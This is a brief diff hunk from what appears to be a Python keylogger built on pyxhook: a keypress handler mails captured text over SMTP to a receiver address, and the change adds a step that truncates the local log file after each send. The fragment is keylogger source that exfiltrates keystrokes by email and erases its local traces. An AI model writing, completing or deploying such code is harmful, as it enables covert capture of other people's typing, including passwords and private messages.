@@ -66,6 +66,8 @@ def KeyPress(event):
         session.sendmail(sender_mail,receiver_mail,text)
         session.quit()
         #Mail Sent
+        file.truncate(0)
+        #Txt size setting 0 byte
 
 
 hook = pyxhook.HookManager()
